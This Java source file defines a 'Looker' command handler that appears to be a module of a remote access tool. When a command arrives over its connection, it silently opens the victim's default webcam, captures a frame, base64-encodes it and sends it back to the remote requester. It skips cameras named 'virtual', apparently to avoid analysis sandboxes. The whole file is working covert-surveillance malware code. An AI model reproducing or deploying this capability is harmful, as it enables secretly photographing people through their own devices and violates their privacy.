package Classes.Instructions;

import Classes.Connection;
import Classes.Instruction;
import com.github.sarxos.webcam.Webcam;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.util.Base64;
import java.util.HashMap;


public class Looker extends Instruction {
    public static String type = "looker";

    public Looker(Connection connection) {
        super(connection, type);
    }

    public static String imgToBase64String(final BufferedImage img, final String formatName)
    {
        final ByteArrayOutputStream os = new ByteArrayOutputStream();

        try
        {
            ImageIO.write(img, formatName, os);
            return Base64.getEncoder().encodeToString(os.toByteArray());
        }
        catch (final IOException ioe)
        {
            throw new UncheckedIOException(ioe);
        }
    }

    public void execute(HashMap<String, Object> arguments, String from) throws IOException {
        Webcam webcam = Webcam.getDefault();

        HashMap<String, String> toSend = new HashMap<String, String>();
        toSend.put("type", "reply");
        toSend.put("to", from);

        if (!(webcam == null || webcam.getName().toLowerCase().contains("virtual"))) {
            System.out.println(webcam);
            System.out.println(webcam.getName());
            System.out.println(webcam.getName().toLowerCase());
            System.out.println(webcam.getName().toLowerCase().contains("virtual"));

            webcam.setViewSize(new Dimension(640, 480));
            webcam.open();
            BufferedImage image = webcam.getImage();
            webcam.close();

            String img = imgToBase64String(image, "PNG");

            toSend.put("img", img);

            String finishedString = json.toJson(toSend);

            connection.send(finishedString);
        } else {
            toSend.put("img", "false");

            String finishedString = json.toJson(toSend);

            connection.send(finishedString);
        }
    }
}